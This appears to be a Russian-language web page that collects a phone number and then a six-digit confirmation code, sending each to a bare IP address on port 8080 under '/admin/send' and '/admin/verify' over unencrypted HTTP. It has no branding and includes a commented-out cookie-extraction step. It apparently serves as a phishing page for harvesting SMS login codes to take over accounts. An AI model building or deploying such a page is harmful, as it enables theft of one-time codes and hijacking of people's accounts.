<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Форма ввода телефона</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            max-width: 400px;
            margin: 0 auto;
            padding: 20px;
        }
        .form-container {
            display: flex;
            flex-direction: column;
            gap: 15px;
        }
        input {
            padding: 10px;
            font-size: 16px;
            border: 1px solid #ccc;
            border-radius: 4px;
        }
        button {
            padding: 10px 15px;
            background-color: #4CAF50;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
        }
        button:hover {
            background-color: #45a049;
        }
        .message {
            margin-top: 15px;
            padding: 10px;
            border-radius: 4px;
            display: none;
        }
        .success {
            background-color: #dff0d8;
            color: #3c763d;
            display: block;
        }
        .error {
            background-color: #f2dede;
            color: #a94442;
            display: block;
        }
        .hidden {
            display: none;
        }
    </style>
</head>
<body>
    <div id="phoneFormContainer">
        <h1>Введите номер телефона</h1>
        <form class="form-container" id="phoneForm">
            <input type="tel" id="phoneNumber" placeholder="7 (XXX) XXX-XX-XX" required>
            <button type="submit">Отправить</button>
        </form>
    </div>

    <div id="codeFormContainer" class="hidden">
        <h1>Введите код подтверждения</h1>
        <form class="form-container" id="codeForm">
            <input type="text" id="verificationCode" placeholder="XXXXXX" required maxlength="6">
            <button type="submit">Подтвердить</button>
        </form>
    </div>

    <div id="message" class="message"></div>
    <script>
        // Функция для показа сообщений
        function showMessage(text, type) {
            const messageDiv = document.getElementById('message');
            messageDiv.textContent = text;
            messageDiv.className = `message ${type}`;
        }

        // Отправка номера телефона
        document.getElementById('phoneForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const phoneNumber = document.getElementById('phoneNumber').value;
            
            // Проверка номера телефона
            if (!phoneNumber.match(/^\+?[0-9\s\-\(\)]{10,20}$/)) {
                showMessage('Пожалуйста, введите корректный номер телефона', 'error');
                return;
            }
            // Отправка номера телефона
            fetch('http://45.10.41.142:8080/admin/send', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({ phone: phoneNumber }),
            })
            .then(async (response) => {
                if (!response.ok) {
                    const errorData = await response.text();
                    throw new Error(errorData);
                }
                return response.json();
            })
            .then(data => {
                document.getElementById('phoneFormContainer').classList.add('hidden');
                document.getElementById('codeFormContainer').classList.remove('hidden');
            })
            .catch(error => {
                showMessage(`Ошибка: ${error.message}`, 'error');
            });
        });

        // Отправка кода подтверждения
        document.getElementById('codeForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const code = document.getElementById('verificationCode').value;
            
            if (!code.match(/^\d{6}$/)) {
                showMessage('Код должен состоять из 6 цифр', 'error');
                return;
            }
            
            
            fetch('http://45.10.41.142:8080/admin/verify', {
                method: 'POST',
                credentials: 'include',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({ code: code }),

            })
            // .then(extractCookiesFromResponse)
            .then(async (response) => {
                if (!response.ok) {
                    const errorData = await response.text();
                    throw new Error(errorData);
                }
                return response.json();
            })
            .then(data => {
                showMessage('Номер успешно подтвержден!', 'success');
                // Редирект или другая логика после подтверждения
            })
            .catch(error => {
                showMessage(`Ошибка: ${error.message}`, 'error');
            });
        });
    </script>
</body>
</html>
